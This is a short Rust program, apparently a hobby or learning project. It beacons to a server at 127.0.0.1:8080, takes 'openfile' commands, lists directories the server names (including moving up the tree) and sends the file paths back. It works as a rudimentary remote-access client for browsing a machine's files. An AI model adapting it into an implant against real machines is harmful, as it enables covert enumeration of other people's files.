use std::io::{Read, Write};
use std::net::TcpStream;
use std::io;
use std::thread;
use std::time::Duration;

use std::fs;

fn main() -> io::Result<()>{
    loop {
        let mut command: String = String::new();

        let mut stream = match TcpStream::connect("127.0.0.1:8080") {
            Ok(stream) => stream,
            Err(e) => {
                println!("Failed to connect to server: {}", e);
                thread::sleep(Duration::from_secs(5));
                continue; // Skip the rest of the loop and try again
            }
        };
    
        loop {
            // Send a message to the server
            let message_to_send = "connect server \n";
            stream.write_all(message_to_send.as_bytes()).expect("Failed to write to socket");
        
            // Receive a message from the server
            let mut buffer = [0u8; 1024];
            let bytes_read = stream.read(&mut buffer).expect("Failed to read from socket");
            let received_message = String::from_utf8_lossy(&buffer[..bytes_read]);

            if  received_message.to_string().contains("openfile") {
                command = received_message.to_string();
            }

            if command.contains("openfile") {
                let mut folder_path = std::env::current_dir()?;

                let mut file_list: Vec<String> = Vec::new();

                
                if received_message.contains("openfile") == false {
                    let rcv = String::from(received_message.to_string().trim());
                    // "../../"
                    println!("Received message from server: {} \n", rcv);
                    if let Ok(new_dir) = folder_path.join(rcv).canonicalize() {
                        folder_path = new_dir;
                        println!("new directore {:?}", folder_path);
                    }
                }

                match fs::read_dir(&folder_path) {
                    Ok(entries) => {
                        for entry in entries {
                            if let Ok(entry) = entry {
                                let path = entry.path();
                                /*
                                if path.is_file() {
                                    println!("File: {:?}", path.file_name().unwrap());
                                } else if path.is_dir() {
                                    println!("Directory: {:?}", path.file_name().unwrap());
                                }
                                */
                                let abs_path = path.canonicalize().expect("Failed to canonicalize path");
                                file_list.push(abs_path.to_string_lossy().to_string());
                            }
                        }
                    }
                    Err(e) => eprintln!("Error listing directory: {}", e),
                }

                let directory = file_list.join(",").to_string();
                file_list.clear();
                let message_to_send_2 = directory;
                stream.write_all(message_to_send_2.as_bytes()).expect("Failed to write to socket");
            }

            thread::sleep(Duration::from_secs(5));
        }
    }

}